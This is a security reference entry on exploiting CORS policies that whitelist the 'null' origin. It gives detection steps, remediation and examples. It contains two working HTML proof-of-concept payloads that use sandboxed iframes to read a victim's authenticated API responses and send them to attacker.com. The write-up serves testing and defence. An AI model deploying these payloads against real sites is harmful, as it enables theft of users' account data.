# CORS: Null Origin Exploitation

**Category:** CORS Misconfiguration
**Severity:** High (with credentials), Medium (without)
**CVSS Range:** 6.5 - 8.8

## Attack Description

Some applications whitelist the `null` origin in their CORS configuration. The `null` origin is sent by browsers in several contexts: sandboxed iframes, local files (`file://`), redirected requests, and `data:` URIs. By crafting a page that triggers a `null` origin request, an attacker can bypass CORS restrictions and read authenticated responses.

This misconfiguration is surprisingly common. Developers sometimes add `null` during local testing and forget to remove it, or their framework generates `Access-Control-Allow-Origin: null` when no whitelist is configured.

## Prerequisites

1. Target responds with `Access-Control-Allow-Origin: null` when `Origin: null` is sent
2. `Access-Control-Allow-Credentials: true` is set
3. Victim's session cookies are not restricted by `SameSite` attributes (or are `SameSite=None`)
4. Victim visits attacker-controlled page

## Exploitation Steps

### 1. Detection

```bash
# Test null origin
curl -s -D- -H "Origin: null" https://target.com/api/user | grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

### 2. Sandboxed Iframe PoC (Primary Method)

```html
<!-- Attacker's page: Sandboxed iframe sends Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      // Can't access parent directly from sandbox
      // Use top-level navigation to exfiltrate
      location = 'https://attacker.com/collect?data=' + 
        encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://target.com/api/user', true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

### 3. Fetch API Variant

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
  fetch('https://target.com/api/account/billing', {
    credentials: 'include'
  }).then(async (data) => {
    fetch('https://attacker.com/collect?data=' + 
      btoa(await data.text()));
  });
</script>
"></iframe>
```

### 4. Important Caveat: Cookie Forwarding in Sandboxes

Modern browsers may NOT forward cookies from sandboxed iframes, especially with `SameSite=Lax` or `Strict`. The null origin exploit works best when:
- Cookies are `SameSite=None; Secure`
- The target doesn't rely on cookies but uses other auth (like IP-based)
- The target exposes sensitive data without authentication

**Fallback for non-credential scenarios**: Even without credentials, null origin CORS can enable access to internal-only resources (SSRF-like behavior through victim's browser).

## Detection Method

### Manual
- Send `Origin: null` header via curl/Burp
- Check for `Access-Control-Allow-Origin: null` in response
- Verify `Access-Control-Allow-Credentials` state
- Test on sensitive API endpoints specifically

### Code Review Red Flags
```python
# Flask-CORS with null in allowed origins
CORS(app, origins=['null', 'https://app.example.com'], supports_credentials=True)

# FastAPI - null in allow_origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["null", "https://app.example.com"],
    allow_credentials=True,
)

# Express - null origin check
if (origin === 'null' || allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
}
```

### Shodan Detection
```
"Access-Control-Allow-Origin: null"
```

## Remediation

1. **Never whitelist `null` as an origin** - there is no legitimate production use case
2. **Remove test configurations before deployment** - `null` origin often leaks from dev environments
3. **Check framework defaults** - some frameworks set `null` when origin list is empty
4. **Defense-in-depth with SameSite cookies**: `SameSite=Lax` or `Strict` prevents cookie forwarding from sandboxed contexts

## Real Examples

1. **Google Docs PDF Reader**: Whitelisted `null` origin with credentials, allowing any sandboxed iframe to read PDF responses authenticated as the user. (PortSwigger research, 2016)

2. **Bitcoin Exchange #3 (PortSwigger)**: Null origin allowed with credentials. Attacker could steal encrypted wallet backups via CORS, then perform offline brute-force against wallet passwords.

3. **Multiple Production Sites (Shodan)**: Searching `"Access-Control-Allow-Origin: null"` on Shodan reveals thousands of production servers with this misconfiguration.

## Web3 Context

- DeFi dashboards that load portfolio data may accept null origins from locally-running portfolio trackers
- Hardware wallet web interfaces (`file://` protocol) may cause developers to whitelist `null`
- Self-hosted node dashboards (Grafana for validators, etc.) often have relaxed CORS
- Bridge interfaces that use sandboxed iframes for cross-chain interaction may inadvertently trust `null`
